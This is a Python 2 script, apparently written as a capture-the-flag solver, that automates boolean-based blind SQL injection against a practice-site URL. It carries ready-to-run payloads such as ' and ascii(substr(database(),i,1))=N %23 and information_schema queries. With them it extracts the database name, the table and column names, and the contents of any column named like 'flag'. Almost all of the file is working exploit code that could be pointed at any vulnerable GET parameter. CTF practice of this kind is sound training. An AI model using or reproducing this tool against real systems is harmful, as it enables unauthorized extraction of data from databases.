#coding:utf-8
#author:r00tuser
#version:v1.0
'''
   自动化getflag，仅接受get请求形式
'''

import requests
import string
import binascii

class gettheflag():
    '''
       normalurl为正常的请求url
       normalstr为正常的返回字符串
       dicstr为可见字符集合
    '''
    def __init__(self,normalurl, normalstr,dicstr):
        self.targeturl = normalurl
        self.s = requests.session()
        self.normalstr = normalstr
        self.dicstr = dicstr
        self.dbname = ''
        self.tablename = ''
        self.columnsname=[]
        self.codeinfor()
        self.getflagmain()

    def codeinfor(self):
        print u'---自动化获取flag,code by r00tuser---'
        print u'-------------------------------------'
        print u'-------------------------------------'
        print u'-------------------------------------'
    '''
        获取数据库名
    '''
    def getthedbname(self):

        tempdblen = 0
        tempdbname= ""
        self.log(u'正在获取数据库名称...')

        for k in range(1,30):
            lenpayload = "' and length(database())>{0} %23"
            lenpayload = lenpayload.format(k)
            if self.checklen(lenpayload):
                   tempdblen = k
                   break
        self.log(u'当前数据库名称长度为 '+tempdblen.__str__())
        if tempdblen!=0:
           for i in range(1,tempdblen+1):
               for j in range(0,len(self.dicstr)):
                   namepayload = "' and ascii(substr(database(),{0},1))={1} %23"
                   namepayload = namepayload.format(i,ord(self.dicstr[j]))
                   if self.checkname(namepayload):
                       tempdbname+=self.dicstr[j]
        self.log(u'当前数据库名称为 '+tempdbname)
        self.dbname = tempdbname
    '''
        获取表名
    '''
    def getthetablename(self):
        temptablelen=0
        temptablename=''

        self.log(u'正在获取数据库 %s 中的表的长度...'% self.dbname)
        for k in range(1,30):
            lenpayload = "' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>{0} %23"
            lenpayload = lenpayload.format(k)
            if self.checklen(lenpayload):
               temptablelen = k
               break

        self.log(u'当前表名称长度为 '+temptablelen.__str__())

        if temptablelen!=0:
           for i in range(1,temptablelen+1):
               for j in range(0,len(self.dicstr)):
                   namepayload = "' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), {0}, 1))={1}%23"
                   namepayload = namepayload.format(i,ord(self.dicstr[j]))
                   if self.checkname(namepayload):
                       temptablename+=self.dicstr[j]
        self.log(u'当前表名称为 '+temptablename)
        self.tablename = temptablename

    '''
        获取字段名
    '''
    def getthecolumnname(self):

        tempcolumnlen=0
        columnslength=[]
        columnsname=[]
        tempcolumnname= ''
        hextablename = '0x'+binascii.b2a_hex(self.tablename)
        self.log(u'正在获取表 %s 中的各字段的长度...'% self.tablename)
        count=1
        for k in range(0,10):
            for j in range(1,20):
                lenpayload = "' and (select length(column_name) from information_schema.columns where table_name ="+hextablename+" limit {0},1)>{1} %23"
                lenpayload = lenpayload.format(k,j)

                if j==1 and self.checklen(lenpayload):
                   break
                elif self.checklen(lenpayload):
                   tempcolumnlen = j
                   print "第%d个字段的长度为%d" % (count,j)
                   columnslength.append(tempcolumnlen)
                   count+=1
                   break

        self.log(u'共有%d个字段' % len(columnslength))
        count=1
        if len(columnslength)!=0:
           for k in range(len(columnslength)):
               for i in range(1,columnslength[k]+1):
                   for j in range(0,len(self.dicstr)):
                       namepayload = "' and ascii(substr((select column_name from information_schema.columns where table_name ="+hextablename+" limit 0,1), {0}, 1))={1} %23"
                       namepayload = namepayload.format(i,ord(self.dicstr[j]))
                       if self.checkname(namepayload):
                           tempcolumnname+=self.dicstr[j]
                           # print tempcolumnname
               columnsname.append(tempcolumnname)
               print u'第%d个字段名为%s' % (count,tempcolumnname)
               count +=1
               tempcolumnname=''
        self.columnsname = columnsname

    '''
        获取带有'flag','fl4g','fl3g'等字样的字段的内容
    '''
    def getflag(self):
        scorelen = 0
        scorevalue = ''
        scorelens = []
        flagcolumns = []
        for column in self.columnsname:
            if 'flag' in column or 'fl4g' in column or 'fl3g' in column:
                flagcolumns.append(column)

        for i in range(len(flagcolumns)):
            for j in range(1,len(self.dicstr)):
                lenpayload = "' and (select length("+flagcolumns[i]+") from "+self.tablename+" limit 0,1)>{0} %23"
                lenpayload = lenpayload.format(j)
                if self.checklen(lenpayload):
                    scorelen = j
                    break
            print '%s字段的内容长度为%d' % (flagcolumns[i],scorelen)
            scorelens.append(scorelen)
            scorelen = 0

        if len(scorelens)!=0:
            for k in range(len(scorelens)):
                for i in range(1,scorelens[k]+1):
                    for j in range(0,len(self.dicstr)):
                        namepayload = "' and ascii(substr((select "+flagcolumns[k]+" from "+self.tablename+"),{0},1))={1} %23"
                        namepayload = namepayload.format(i,ord(self.dicstr[j]))
                        if self.checkname(namepayload):
                            scorevalue+=self.dicstr[j]
                            print scorevalue
                print 'flag is %s' % scorevalue
                scorevalue = ''
        print u'flag获取完毕!'
    '''
        判断正常页面返回字符串
    '''
    def checklen(self,payload):
        rep = ''
        try:
            rep = self.s.get(self.targeturl+payload).text
        except:
            print u'没网做你妹的题啊，滚去检查你的网络!!'
            exit(-1)
        return False if self.normalstr in rep else True
    '''
        判断正常页面返回字符串
    '''
    def checkname(self,payload):
        rep =''
        try:
            rep = self.s.get(self.targeturl+payload).text
        except:
            print u'没网做你妹的题啊，滚去检查你的网络!!'
            exit(-1)
        return True if self.normalstr in rep else False

    '''
        打印信息
    '''
    def log(self,logstr):
        print logstr

    def getflagmain(self):
        self.getthedbname()
        self.getthetablename()
        self.getthecolumnname()
        self.getflag()

if __name__ == '__main__':
    dicstr =list(string.digits+string.ascii_letters+"{},.`!@#$%^&*()~-+/|[];'\\><_=")
    flag = gettheflag('http://ctf5.shiyanbar.com/web/index_3.php?id=1','Hello!',dicstr)


